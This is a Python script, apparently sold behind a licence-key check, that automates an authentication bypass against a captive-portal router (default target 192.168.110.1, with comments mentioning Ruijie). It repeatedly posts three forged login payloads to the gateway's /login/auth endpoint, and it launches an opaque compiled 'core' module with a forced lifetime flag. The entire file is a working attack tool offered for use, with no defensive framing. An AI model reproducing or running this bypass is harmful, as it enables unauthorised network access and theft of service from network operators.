import sys, os, hashlib, subprocess, datetime, requests, time, threading
from colorama import Fore, init

init(autoreset=True)

# --- LICENSE SYSTEM (YUTA KEY) ---
SALT = "AHO_PRO_FINAL_2026_SECURE"
KEY_FILE = os.path.expanduser("~/.aho_key_data")

def get_net_time():
    try:
        res = requests.get('http://worldtimeapi.org/api/timezone/Asia/Yangon', timeout=5)
        return datetime.datetime.strptime(res.json()['datetime'][:10], "%Y-%m-%d")
    except: return datetime.datetime.now()

def get_hwid():
    try:
        user = subprocess.check_output(['whoami']).decode().strip()
    except: user = "user"
    return f"AHO-{hashlib.md5(user.encode()).hexdigest()[:6].upper()}"

def check_access():
    uid = get_hwid()
    now = get_net_time()
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "r") as f:
            saved_key = f.read().strip()
            for i in range(0, 366):
                check_date = (now + datetime.timedelta(days=i)).strftime("%Y-%m-%d")
                if saved_key == hashlib.md5(f"{uid}|{check_date}|{SALT}".encode()).hexdigest()[:12].upper():
                    return True
    return False

# --- DIRECT BYPASS MODES ---
def send_bypass_requests(host):
    # Method 1: Standard Direct Auth
    # Method 2: Mac-based Bypass (Ruijie အသစ်တွေမှာ သုံးတာ)
    # Method 3: One-click Auth Bypass
    
    url = f"http://{host}/login/auth"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    payloads = [
        {"auth_type": "direct", "mode": "1"},
        {"auth_type": "mac_auth", "user_mac": "00:00:00:00:00:00"},
        {"auth_type": "one_click", "is_confirm": "1"}
    ]
    
    for data in payloads:
        try:
            res = requests.post(url, data=data, headers=headers, timeout=3)
            if res.status_code == 200:
                print(f"{Fore.GREEN}[+] Bypass Signal Sent: {data['auth_type']}")
        except: pass

def start_yuta_hack():
    os.system('clear')
    print(f"{Fore.CYAN}--- YUTA DIRECT BYPASS ENGINE ---")
    
    target = "192.168.110.1"
    if os.path.exists(".ip"):
        with open(".ip", "r") as f: target = f.read().strip()

    print(f"{Fore.YELLOW}[*] Targeting: {target}")

    try:
        # ၁။ core.so ကို ချိတ်မယ်
        sys.path.append(os.getcwd())
        import core
        core.IS_LIFETIME = True
        
        # ၂။ အစ်ကို့ရဲ့ core engine ကို နှိုးမယ်
        print(f"{Fore.BLUE}[*] Launching Core Engine...")
        threading.Thread(target=core.run_bg_bypass if hasattr(core, 'run_bg_bypass') else core.main, daemon=True).start()
        
        # ၃။ နောက်ထပ် Bypass လမ်းကြောင်းသစ်တွေကို တောက်လျှောက်ပို့မယ်
        print(f"{Fore.YELLOW}[*] Injecting Direct Bypass Payloads...")
        while True:
            send_bypass_requests(target)
            sys.stdout.write(f"\r{Fore.GREEN}[✔] Engine Running... Press Ctrl+C to stop.")
            sys.stdout.flush()
            time.sleep(1)

    except Exception as e:
        print(f"{Fore.RED}[✘] Error: {e}")

if __name__ == "__main__":
    if check_access():
        start_yuta_hack()
    else:
        print(f"{Fore.RED}[✘] KEY ERROR")
